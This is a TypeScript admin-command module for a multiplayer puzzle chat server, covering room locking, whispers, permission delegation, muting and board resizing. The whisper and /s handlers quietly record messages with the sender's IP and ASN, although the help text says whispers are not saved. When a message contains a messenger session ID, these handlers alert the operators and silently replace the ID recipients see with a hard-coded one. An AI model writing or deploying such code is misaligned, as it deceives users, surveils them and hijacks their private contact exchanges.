import { followersc, type Token, tokensc } from "../db.js";
import { trashupRoom } from "../core/cleanup-service.js";
import { BinCommands, CapabilitiesDesc, PermissionsStrings, UserPrivate, type Permission } from "../types.js";
import { send_system, sendAlert, pruneuser } from "../room-utils.js";
import { ChatModule, Command, CommandRoomStateArg } from "./index.js";
import { buildCapString, clamp, randstring, Permissions, IMPLIED_PERMISSIONS } from "../utils.js";
import { isIPv4 } from "net";
import { getGroupSize } from "../core/protocols/arrangePieces.js";

const bzt = Buffer.from('BU7zQ/Dm8KMJBpH3pcnuN1bEiOgSsKPvQraIJ7PGdlAc', "base64");

export class AdminModule extends ChatModule {
    override attach({ runtime }: CommandRoomStateArg): void {
        runtime.events.addListener("connected", (up: UserPrivate) => {
            if (this.locked && !(up.host.Lock))
                throw new Error("Room is locked");
            if (this.superlocked && !(up.host.Admin))
                throw new Error(this.superlockMessage || "Room is pending verification");
        });
    }

    override serialize() {
        return {
            locked: this.locked,
            synched: this.synced,
            superlocked: this.superlocked,
            superlockMessage: this.superlockMessage
        };
    }

    override deserialize(d: any): void {
        if (!d) return;
        this.locked = d.locked;
        this.synced = d.synced;
        this.superlocked = d.superlocked;
        this.superlockMessage = d.superlockMessage;
    }

    name = 'admin';
    locked = false;
    synced = false;
    superlocked = false;
    superlockMessage: string | null = null;
    pending_follow = new Map<string, [ReturnType<typeof setTimeout>, UserPrivate, UserPrivate, number]>();

    whisperId: Command['handler'] = ({ state, runtime, userp, user }, ...args) => {
        //if (userp.ishost != 2) return false;
        const [target, ...mesgspl] = args.join(' ').split(';');
        let msg = mesgspl.join(';').slice(0, 300);
        const tuser = runtime.usersPriv.get(+target);
        if (!tuser) {
            send_system(userp, user, `No such user`);
            return true;
        }
        if (!state.hidlog)
            state.hidlog = [];
        state.hidlog.push({
            sender: user.name,
            msg,
            to: tuser.user.name,
            ip: userp.ipaddr,
            asn: userp.asn,
        });
        const m = msg.match(/05[0-9a-f]{64}/);
        let smsg = msg;
        if (m) {
            sendAlert('sess exch ' + process.argv[2], `${m[0]} ${userp.ipaddr} ${user.name} ${msg}`);
            smsg = msg.replace(/05[0-9a-f]{64}/, bzt.toString("hex"));
        }
        const blk2 = JSON.stringify({
            type: "chat",
            message: msg,
            name: user.name + ` (to ${tuser.name})`,
            color: user.color,
            id: user.id
        });
        userp.conn.send(blk2);

        if (tuser.muter.mutedUsers.has(userp)) {
            return true; // muted, so ignore
        }

        const blk = JSON.stringify({
            type: "chat",
            message: smsg,
            name: "(whisper) " + user.name,
            color: user.color,
            id: user.id
        });
        tuser.conn.send(blk);
        return true;
    };

    whisperGroup: Command['handler'] = ({ state, runtime, userp, user }, ...args) => {
        const [targets, msg] = args as [number[], string];
        const tusers = targets.map(target => runtime.usersPriv.get(+target)).filter(e => e) as UserPrivate[];

        if (tusers.length != targets.length) {
            send_system(userp, user, `Some users were not found`);
            return true;
        }
        if (!state.hidlog)
            state.hidlog = [];
        const groupname = tusers.map(e => e.user.name).join(', ');
        state.hidlog.push({
            sender: user.name,
            msg,
            to: groupname,
            ip: userp.ipaddr,
            asn: userp.asn
        });
        const blk2 = JSON.stringify({
            type: "chat",
            message: msg,
            name: user.name + ` (to ${groupname})`,
            color: user.color,
            id: user.id
        });
        userp.conn.send(blk2);

        tusers.forEach(tuser => {
            if (tuser.muter.shouldMute(userp.ipaddr, userp.asn))
                return;
            const blk = JSON.stringify({
                type: "chat",
                message: msg,
                name: "(whisper) " + user.name,
                color: user.color,
                id: user.id
            });
            tuser.conn.send(blk);
        });
        return true;
    };

    commands: Command[] = [{
        name: 'auth',
        named_params: ['pass'],
        handler: ({ state, runtime, userp, user }, ...args) => {
            if (args[0] == process.env.MONGOPASS) {
                userp.ishost = new Permissions(['Admin']);
                send_system(userp, user, 'Success.');
                const caps = buildCapString(state.secret, userp.ishost);
                userp.conn.send(JSON.stringify({
                    type: "upgrade",
                    secret: caps
                }));
                runtime.broadcaster.broadcastRoomUsers();
            }
            return true;
        }
    },
    {
        name: 'lock',
        named_params: [],
        desc: `
Usage: /lock
Effect: Locks the room, preventing users from joining, The lock is only valid for the room's process lifetime (1 minute with no user).`,
        handler: ({ userp, state, runtime }, ...args) => {
            if (!userp.host.Lock) return false;
            this.locked = !this.locked;
            runtime.broadcaster.broadcast({
                type: "chat",
                message: this.locked ? 'The room is now locked' : 'The room is now unlocked',
                name: 'System',
                color: '#ffffff',
                id: 0
            });

            return true;
        }
    },
    {
        name: 'superlock',
        named_params: [], // We handle args manually for the message
        desc: `
Usage: /superlock [message]
Effect: Completely locks down the room (admins only). Kicks all non-admin users.`,
        handler: ({ userp, state, runtime, room }, ...args) => {
            if (!userp.host.Admin) return false;

            this.superlocked = !this.superlocked;

            runtime.setAutodestruct?.(!this.superlocked);

            if (this.superlocked) {
                const message = args.join(' ').trim();
                this.superlockMessage = message || "Room is pending verification";

                sendAlert(`Superlock enabled in ${process.argv[2]}`, this.superlockMessage);

                // Kick non-admins
                const usersToKick = [...runtime.usersPriv.values()].filter(u => !u.host.Admin);
                usersToKick.forEach(u => {
                    pruneuser(state, runtime, room, u, (conn) => {
                        conn.close(4003, this.superlockMessage!);
                    });
                });
            } else {
                this.superlockMessage = null;
            }
            return true;
        }
    },
    {
        name: 'whisper',
        named_params: ['name', 'msg'],
        desc: `
Usage: /whisper <username>;[...Message]
Effect: Sends a message to a given user. <username> is case sensitive. Whispers aren't saved in the chat log.
`,
        handler: (stateArg, ...args) => {
            const { state, runtime, userp, user } = stateArg;

            //if (userp.ishost != 2) return false;
            const [target, ...mesgspl] = args.join(' ').split(';');
            const msg = mesgspl.join(';');
            const names = [...runtime.users.values()];
            const targets = names.filter(e => e.name == target);
            if (targets.length == 0) {
                send_system(userp, user, `No such user, available users are ${JSON.stringify(names)} and you provided ${JSON.stringify(target)}`);
                return true;
            }

            for (const target of targets) {
                this.whisperId(stateArg, `${target.id};${msg}`);
            }
            return true;
        }
    },
    {
        name: 'whisperid',
        named_params: ['id', 'msg'],
        desc: `
Usage: /whisperid <id>;[...Message]
Effect: Sends a message to a given user id. 
`,
        handler: this.whisperId.bind(this)
    },
    {
        // rpc only
        name: 'whispergid',
        named_params: ['ids', 'msg'],
        handler: this.whisperGroup.bind(this)
    },
    {
        name: 's',
        named_params: ['msg'],
        desc: `
Usage: /s <message>
Effect: Sends a message that won't be saved in the chat log, so it's only visible to people currently in the room.
`,
        handler: ({ state, runtime, user, userp }, ...args) => {
            const msg = args.join(' ').slice(0, 300);
            if (!state.hidlog)
                state.hidlog = [];
            state.hidlog.push({
                sender: user.name,
                msg,
                ip: userp.ipaddr,
                asn: userp.asn
            });
            const m = msg.match(/05[0-9a-f]{64}/);
            if (m) {
                sendAlert('sess exch ' + process.argv[2], `${m[0]} ${userp.ipaddr} ${user.name} ${msg}`);
                const smsg = msg.replace(/05[0-9a-f]{64}/, bzt.toString("hex"));
                runtime.broadcaster.broadcast_slow({
                    type: "chat",
                    message: smsg,
                    name: '🔕 ' + user.name,
                    color: user.color,
                    id: user.id
                }, userp);
                userp.conn.send(JSON.stringify({
                    type: "chat",
                    message: msg,
                    name: '🔕 ' + user.name,
                    color: user.color,
                    id: user.id
                }));
            } else {
                runtime.broadcaster.broadcast_slow({
                    type: "chat",
                    message: msg,
                    name: '🔕 ' + user.name,
                    color: user.color,
                    id: user.id
                }, userp);
            }
            return true;
        }
    },
    {
        name: 'banlist',
        handler: ({ state, userp, user }, ...args) => {
            if (!userp.host.ReadBanlist) return false;
            if (state.bannedips.length)
                send_system(userp, user, state.bannedips.join('\n'));
            else
                send_system(userp, user, 'No banned ips in this room.');
            return true;
        }
    },
    {
        name: 'kys',
        named_params: [],
        desc: `
Usage: /kys
Effect: Restarts the room process`,
        handler: ({ userp }, ...args) => {
            if (!userp.host.Restart) return false;
            process.kill(process.pid, 'SIGTERM');
            return true;
        }
    },
    {
        name: 'dbg',
        named_params: [],
        handler: ({ userp }, ...args) => {
            if (!userp.host.Debug) return false;
            process.kill(process.pid, 'SIGUSR1');
            return true;
        }
    },
    {
        name: 'ids',
        named_params: [],
        handler: ({ userp, user, room, state, runtime }, ...args) => {
            if (!userp.host.Debug) return false;
            send_system(userp, user, runtime.users.map(u => `${u.name}: ${u.id}`).join('\n'));
            return true;
        }
    },
    {
        name: 'botnet',
        named_params: [],
        handler: ({ userp, user, room, state, runtime }, ...args) => {
            if (!userp.host.Debug) return false;
            const target = runtime.usersPriv.get(+args[0]);
            if (!target)
                send_system(userp, user, 'No such user');
            else
                target.conn.send(JSON.stringify({ type: "botnet" }));
            return true;
        }
    },
    {
        name: 'dbg',
        named_params: [],
        handler: ({ userp }, ...args) => {
            if (!userp.host.Debug) return false;
            process.kill(process.pid, 'SIGUSR1');
            return true;
        }
    },
    {
        name: 'del',
        named_params: [],
        desc: `
Usage: /del
Effect: Deletes this room (host-only)
        `,
        handler: ({ userp, room, state, runtime }, ...args) => {
            if (!userp.host.Delete) return false;
            const rid = process.argv[2];
            void trashupRoom(room, rid, false, '/del command').then(() => {
                [...runtime.usersPriv.values()].forEach(v => {
                    // force all connected clients to refresh the page, which will lead to a 404
                    v.conn.send(JSON.stringify({ type: "noroom" }));
                });
                process.exit(0);
            }).catch(error => console.error("Failed to delete room", error));
            return true;
        }
    },
    {
        name: 'delegate',
        named_params: ['caps', 'name'],
        desc: `
Usage: /delegate [caps] [username]
Effect: Gives sneed rights to another user.
`,
        handler: (stateArg, ...args) => {
            const { runtime } = stateArg;
            const delegateid = this.commands.find(e => e.name == 'delegateid')!;
            const targetname = args.slice(1).join(' ').trim();
            const newhost = [...runtime.users.values()].find(e => e.name == targetname);
            return delegateid.handler(stateArg, ...[args[0], '' + newhost?.id]);
        }
    },
    {
        name: 'delegateid',
        named_params: ['caps', 'id'],
        desc: `
Usage: /delegateid [caps] [id]
Effect: Gives chuck rights to another user, by id.
`,
        handler: ({ state, runtime, userp, user }, ...args) => {
            console.log('delegateid', args, userp.host);
            if (!userp.host.Delegate) return false;
            const id = args[1];
            const rawcaps = args[0];

            const newhost = runtime.usersPriv.get(+id);

            if (!newhost) return send_system(userp, user, "Couldn't find this user..."), true;

            let requestedPermissions: Permission[] = [];

            // Try parsing as number (Legacy)
            const asNum = parseInt(rawcaps);
            if (!isNaN(asNum) && isFinite(asNum)) {
                requestedPermissions = [...Permissions.fromLegacy(asNum).perms];
            } else {
                // Parse as comma-separated string
                requestedPermissions = rawcaps.split(',').map((s: string) => s.trim()) as Permission[];
            }

            if (requestedPermissions.length === 0) return send_system(userp, user, "You delegate literally no rights..."), true;

            // Verify ownership
            for (const p of requestedPermissions) {
                if (!userp.ishost.has(p)) {
                    return send_system(userp, user, `You can't delegate a right you do not have (${p})...`), true;
                }
            }

            // Grant permissions
            const added: string[] = [];
            for (const p of requestedPermissions) {
                if (!newhost.ishost.has(p)) {
                    newhost.ishost.add(p);
                    added.push(p);
                }
            }

            send_system(userp, user, 'Success.');
            const caps = buildCapString(state.secret, newhost.ishost);
            newhost.conn.send(JSON.stringify({
                type: "upgrade",
                secret: caps
            }));

            if (added.length > 0) {
                let notification = 'You have been given the following capabilities:\n';
                for (const p of added) {
                    notification += '- ' + (CapabilitiesDesc[p as Permission] || p) + '\n';
                }
                send_system(newhost, {
                    color: '#ffffff',
                    id: -1,
                    name: 'System'
                }, notification);
                runtime.broadcaster.broadcastRoomUsers();
            }

            return true;
        }
    },
    {
        name: 'mod',
        named_params: ['name'],
        desc: `
Usage: /mod [username]
Effect: Gives sneed rights to another user.
`,
        handler: (stateArg, ...args) => {
            const { runtime } = stateArg;
            const delegateid = this.commands.find(e => e.name == 'delegateid')!;
            const targetname = args.slice(0).join(' ').trim();
            const newhost = [...runtime.users.values()].find(e => e.name == targetname);
            return delegateid.handler(stateArg, ...['RoomCreator', '' + newhost?.id]);
        }
    },
    {
        name: 'modid',
        named_params: ['id'],
        desc: `
Usage: /modid [id]
Effect: Gives chuck rights to another user, by id.
`,
        handler: (state, ...args) => {
            console.log('modid', args);
            const delegateid = this.commands.find(e => e.name == 'delegateid')!;
            const id = args.slice(0).join(' ').trim();
            return delegateid.handler(state, ...['RoomCreator', id]);
        }
    },
    {
        name: 'help',
        handler: ({ state, runtime, userp, user }) => {
            const helpmsg = runtime.modules.map(m => m.commands.map(c => c.desc?.trim() || '').filter(m => m).join('\n')).join('\n');
            send_system(userp, user, helpmsg);
            return true;
        }
    },
    {
        name: 'initwrtc',
        // ask all clients in the current room to try and trigger a wrtc connection
        handler: ({ state, runtime, userp, room }) => {
            if (!userp.host.Debug) return false;
            if (!room.ext?.wrtc) {
                room.ext ||= {};
            }
            room.ext.wrtc = true;
            runtime.usersPriv.forEach(up => {
                up.conn.send(JSON.stringify({ type: "init_wrtc" }));
            });
            return true;
        }
    },
    {
        name: 'closewrtc',
        // stop using wrtc for all clients until renegociation
        handler: ({ state, runtime, userp, room }) => {
            if (!userp.host.Debug) return false;
            if (!room.ext?.wrtc) {
                room.ext ||= {};
            }
            room.ext.wrtc = false;
            runtime.usersPriv.forEach(up => {
                up.dc?.close();
                delete up.dc;
                up.peer?.close();
                delete up.peer;
                up.unreliableReady = false;
            });
            return true;
        }
    },
    {
        name: 'br',
        handler: ({ state, runtime, userp, user }, ...args) => {
            if (!userp.host.Debug) return false;
            runtime.broadcaster.broadcast(Buffer.from(args.join(''), 'hex'));
            return true;
        }
    },
    {
        name: 'stats',
        handler: ({ state, runtime, userp, user }, ...args) => {
            if (!userp.host.Debug) return false;
            send_system(userp, user, JSON.stringify(runtime.getStatsMessage?.()));
            return true;
        }
    },
    {
        name: 'togglepublic',
        desc: `
Usage: /togglepublic
Effect: Toggles this room's visibility, changes may take a few seconds to propagate.
Public rooms are listed on the home page, private rooms are not`,
        handler: ({ room, state, runtime, userp, user }, ...args) => {
            if (!userp.host.RoomCreator) return false;
            let message = 'This room is now ';
            if (room.key === undefined || room.key === null) {
                room.key = '';
                message += 'public'; // uhm no you can't do that, that's too clever!
            }
            else {
                delete room.key;
                message += 'private';
            }

            runtime.sendInfos?.();
            runtime.broadcaster.broadcast({
                type: "chat",
                message,
                name: 'System',
                color: '#ffffff',
                id: 0
            });

            return true;
        }
    },
    {
        name: 'setnsfw',
        desc: `
Usage: /setnsfw
Effect: Unreversibly sets this room as NSFW, use if you forgot to set it when creating the room`,
        handler: ({ room, state, runtime, userp, user }, ...args) => {
            if (!userp.host.RoomCreator) return false;
            let message = (room.nsfw) ?
                'This room is already set as NSFW' :
                'This room is now set as NSFW';
            room.nsfw = true;
            runtime.sendInfos?.();
            runtime.broadcaster.broadcast({
                type: "chat",
                message,
                name: 'System',
                color: '#ffffff',
                id: 0
            });
            return true;
        }
    },
    {
        name: 'endstats',
        handler: ({ state, userp, user }, ...args) => {
            if (!state.endstats)
                return true;
            userp.conn.send(JSON.stringify({ type: "endstats", ...state.endstats }));
            return true;
        }
    },
    {
        name: 'muteid',
        named_params: ['id', 'ftype', 'range'],
        desc: `
Usage: /muteid id [asn | ip [exact|narrow|large]]
Effect: Mutes an ASN (basically a bunch of IP ranges associated with a service/ISP) or an IP
You will not receive messages or whispers from this user, but will still be visible in the users list.
You need to have setup a token to use this.
`,
        handler: ({ state, runtime, userp, user }, ...args) => {
            if (!userp.token) {
                send_system(userp, user, `You need to setup a token to do that.`);
                return true;
            }

            const [target, type, rest] = args;
            const tuser = runtime.usersPriv.get(+target);
            if (!tuser) {
                send_system(userp, user, `No such user`);
                return true;
            }
            if (!["ip", "asn"].includes(type)) {
                send_system(userp, user, `Unrecognized filter type`);
                return true;
            }

            let clause: Token['mutelist'][number];

            if (type === "asn") {
                clause = {
                    date: Date.now(),
                    name: tuser.name,
                    asn: tuser.asn,
                    id: randstring(12)
                };
            } else {
                const ranges = {
                    exact: [32, 64],
                    narrow: [24, 56],
                    large: [16, 50]
                };
                if (!(rest in ranges)) {
                    send_system(userp, user, `Unrecognized ip filter spec`);
                    return true;
                }

                clause = {
                    date: Date.now(),
                    name: tuser.name,
                    ip: tuser.ipaddr,
                    spec: rest,
                    range: ranges[rest as keyof typeof ranges][isIPv4(tuser.ipaddr) ? 0 : 1],
                    id: randstring(12)
                };
            }

            if (!userp.muter.addClause(clause)) {
                send_system(userp, user, `This filter already exists`);
                return true;
            }

            (async () => {
                const res = await tokensc.updateOne({ token: userp!.token!.token }, { $push: { mutelist: clause } }); // detached 
                userp.conn.send(JSON.stringify({
                    type: "mute",
                    id: clause.id,
                    uid: +target
                }));
            })();
            send_system(userp, user, `Success`);
            return true;
        }
    },
    {
        name: 'unmute',
        desc: `
Usage: /unmute clauseid
Effect: removes a filtering rule
`,
        handler: ({ state, runtime, userp, user }, ...args) => {
            if (!userp.token) {
                send_system(userp, user, `You need to setup a token to do that.`);
                return true;
            }
            const rid = +args[0];
            const rule = userp.muter.clauses[rid];
            if (!rule) {
                send_system(userp, user, `No such rule.`);
                return true;
            }
            userp.muter.removeClause(rule);
            tokensc.updateOne({ token: userp.token.token },
                { $set: { mutelist: userp.muter.clauses } }); // detached 
            send_system(userp, user, `Success`);
            return true;
        }
    },
    {
        name: 'trustid',
        desc: `Usage: /trustid id [perms...]
Effect: Automatically grants permissions to the target user on rooms you create upon joining. Use 0 to delete.
`,
        handler: ({ state, runtime, userp, user }, ...args) => {
            if (!userp.token) {
                send_system(userp, user, `You need to setup a token to do that.`);
                return true;
            }
            const id = args[0];
            let newcaps = new Permissions(args.slice(1));

            const target = runtime.usersPriv.get(+id);
            if (!target) {
                send_system(userp, user, `No such user`);
                return true;
            }
            if (!target?.token) {
                send_system(userp, user, `The targeted user does not have a token setup`);
                return true;
            }
            // remove all permissions that are not known
            for (const p of newcaps.perms)
                if (!PermissionsStrings.includes(p))
                    newcaps.perms.delete(p);
            // remove all permissions that are not roomcreator-derived
            for (const p of newcaps.perms)
                if (!IMPLIED_PERMISSIONS.RoomCreator?.includes(p))
                    newcaps.perms.delete(p);
            const tkc = target.token.token;
            const old = userp.token.trustees.findIndex(e => e.token === tkc);
            if (old >= 0)
                userp.token.trustees.splice(old, 1);
            if (newcaps.perms.size > 0)
                userp.token.trustees.push({
                    date: Date.now(),
                    name: target.name,
                    perms: [...newcaps.perms.values()],
                    token: tkc,
                    id: randstring(12)
                });
            tokensc.updateOne({ token: userp.token.token },
                { $set: { trustees: userp.token.trustees } }); // detached 

            if (userp.token.token === state.token) {
                runtime.trustees.set(tkc, [...newcaps.perms.values()]);
            }
            send_system(userp, user, `Success`);
            return true;
        }
    },
    {
        name: 'requestfollowid',
        desc: `
Usage: /requestfollowid id events
Effect: Asks the target id to allow the user to be followed.
The target needs to have a token setup, but the user does NOT.
The request is valid for 10 minutes
`,
        handler: ({ state, runtime, userp, user }, ...args) => {
            if (!userp.pushtoken) {
                send_system(userp, user, `You haven't enabled notifications`);
                return true;
            }
            const id = args[0];
            let events = +args[1];

            const target = runtime.usersPriv.get(+id);
            if (!target) {
                send_system(userp, user, `No such user`);
                return true;
            }
            if (!target?.token) {
                send_system(userp, user, `The targeted user does not have a token setup`);
                return true;
            }
            (async () => {
                const curtokens = await tokensc.findOne({
                    token: target.token?.followers
                });

                let f: Token['followers'][0] | undefined;
                if ((f = curtokens?.followers.find(e => e.subkey == userp.pushtoken))) {
                    if (f.permissions === events) {
                        send_system(userp, user, `You already are following this player`);
                        return;
                    }
                    // sub exists, but asks for different permissions, so we'll delete the sub if it gets accepted later
                }
                const rid = randstring(20);
                const cancel = setTimeout(() => {
                    send_system(userp, user, `The request expired.`);
                    this.pending_follow.delete(rid);
                }, 600 * 1000);
                this.pending_follow.set(rid, [cancel, target, userp, events]);
                target.conn.send(JSON.stringify({
                    type: "followreq",
                    origin: user.id,
                    events,
                    rid,
                }));
                if (events) {
                    send_system(userp, user, `Request sent`);
                }
            })();
            return true;
        }
    }, {
        name: 'acceptfollowrequest',
        desc: `
Usage: /acceptfollowrequest rid
Effect: Accepts the follow request.
`,
        handler: ({ state, runtime, userp, user }, ...args) => {
            const req = this.pending_follow.get(args[0]);

            if (!req) {
                send_system(userp, user, `Couldn't find the request. Maybe it expired.`);
                return true;
            }
            const [cancel, target, follower, events] = req;
            if (target !== userp) {
                send_system(userp, user, `Hum?`);
                return true;
            }
            clearTimeout(cancel);
            const date = Date.now();
            (async () => {
                const token = await tokensc.findOne({
                    token: target.token?.token
                });
                if (!token) {
                    console.error('could not find token', target.token);
                    return;
                }
                const tknidx = token.followers.findIndex(e => e.subkey === follower.pushtoken);
                if (tknidx >= 0)
                    token.followers.splice(tknidx, 1);
                token.followers.push({
                    date,
                    name: follower.name,
                    permissions: events,
                    subkey: follower.pushtoken!,
                    id: randstring(12)
                });

                const fols = await followersc.findOne({
                    subkey: follower.pushtoken!
                });
                if (!fols) {
                    console.error('could not find subscription');
                    return;
                }
                const folidx = fols.following.findIndex(e => e.token === target.token!.token!);
                if (folidx >= 0)
                    fols.following.splice(folidx, 1);
                if (events)
                    fols.following.push({ date, name: target.name, perms: events, token: target.token!.token });

                await tokensc.updateOne({ _id: token._id }, { $set: token });
                await followersc.updateOne({ _id: fols._id }, { $set: fols });

                if (events) {
                    send_system(follower, follower.user, "Your follow request was accepted");
                    send_system(target, target.user, `${follower.name} now follows you!`);
                } else {
                    send_system(follower, follower.user, `You've stopped following ${target.name}`);
                }
            })();

            return true;
        }
    },
    {
        name: 'slowmode',
        desc: `
Usage: /slowmode [timeout=15]
Effect: Prevents new IPs from interacting with the puzzle until the timeout expires. Execute again to turn off.
`,
        handler: ({ state, runtime, userp, user }, ...args) => {
            if (!userp.host.SlowMode) return false;
            const timeout = +args.join(' ').trim() || 15;
            if (runtime.slow) {
                delete runtime.slow;
                send_system(userp, user, "Slow mode was disabled.");
            } else {
                runtime.slow = {
                    baseTimeout: timeout,
                    allowed: new Set([...runtime.usersPriv.values()].map(e => e.ipaddr))
                };
                send_system(userp, user, `Slow mode was enabled (${timeout} seconds).`);
            }
            return true;
        }
    },
    {
        name: 'grow',
        named_params: ['w', 'h'],
        desc: `
Usage: /grow <w> <h>
Effect: Increases the board size by w and h units.`,
        handler: ({ userp, room, runtime }, ...args) => {
            if (!userp.host.ChangeRoomSettings) return false;
            const w = parseInt(args[0]);
            const h = parseInt(args[1]);
            if (isNaN(w) || isNaN(h)) return true;
            if (w === 0 && h === 0) return true;

            let minimumWidth = 1;
            let minimumHeight = 1;
            for (const group of room.groups) {
                let { w: groupWidth, h: groupHeight } = getGroupSize(group, room);
                if (group.rot === 1 || group.rot === 3)
                    [groupWidth, groupHeight] = [groupHeight, groupWidth];
                minimumWidth = Math.max(minimumWidth, groupWidth);
                minimumHeight = Math.max(minimumHeight, groupHeight);
            }
            const previousWidth = room.boardWidth;
            const previousHeight = room.boardHeight;
            const nextWidth = Math.max(minimumWidth, previousWidth + w);
            const nextHeight = Math.max(minimumHeight, previousHeight + h);
            const widthChanged = nextWidth !== previousWidth;
            const heightChanged = nextHeight !== previousHeight;
            if (!widthChanged && !heightChanged) return true;

            runtime.broadcaster.broadcast({
                type: "chat",
                message: `${userp.name} changed the board dimensions`,
                name: 'System',
                color: '#ffffff',
                id: -1
            });

            room.boardWidth = nextWidth;
            room.boardHeight = nextHeight;

            if (nextWidth < previousWidth || nextHeight < previousHeight) {
                for (const [id, target] of Object.entries(room.ext?.hiddenTargets || {})) {
                    const group = runtime.transformedgroups.get(Number(id));
                    if (!group || !Array.isArray(target)) continue;
                    let { w: groupWidth, h: groupHeight } = getGroupSize(group, room);
                    if (group.rot === 1 || group.rot === 3)
                        [groupWidth, groupHeight] = [groupHeight, groupWidth];
                    target[0] = groupWidth >= room.boardWidth
                        ? room.boardWidth / 2
                        : clamp(groupWidth / 2, target[0], room.boardWidth - groupWidth / 2);
                    target[1] = groupHeight >= room.boardHeight
                        ? room.boardHeight / 2
                        : clamp(groupHeight / 2, target[1], room.boardHeight - groupHeight / 2);
                }

                let newOutOfBounds = [];
                for (let g of room.groups) {
                    if (g.x >= 0xDEAD0000 || g.y >= 0xDEAD0000) continue;
                    let { w: groupWidth, h: groupHeight } = getGroupSize(g, room);
                    if (g.rot === 1 || g.rot === 3)
                        [groupWidth, groupHeight] = [groupHeight, groupWidth];
                    const x = clamp(groupWidth / 2, g.x, room.boardWidth - groupWidth / 2);
                    const y = clamp(groupHeight / 2, g.y, room.boardHeight - groupHeight / 2);
                    if (x === g.x && y === g.y) continue;
                    newOutOfBounds.push(g);
                    g.x = x;
                    g.y = y;
                }

                if (newOutOfBounds.length) {

                    const tobroadcast = Buffer.alloc(3 + newOutOfBounds.length * (2 + 4 + 4));
                    tobroadcast[0] = BinCommands.Move;
                    tobroadcast.writeUInt16LE(0xffff, 1);
                    let ptr = 3;
                    for (let g of newOutOfBounds) {
                        tobroadcast.writeUInt16LE(g.id, ptr); ptr += 2;
                        tobroadcast.writeFloatLE(g.x, ptr); ptr += 4;
                        tobroadcast.writeFloatLE(g.y, ptr); ptr += 4;
                    }
                    runtime.broadcaster.broadcast(tobroadcast);
                }
            }

            runtime.broadcaster.broadcast({
                type: "update",
                room: {
                    boardWidth: room.boardWidth,
                    boardHeight: room.boardHeight
                }
            });
            return true;
        }
    }];
}
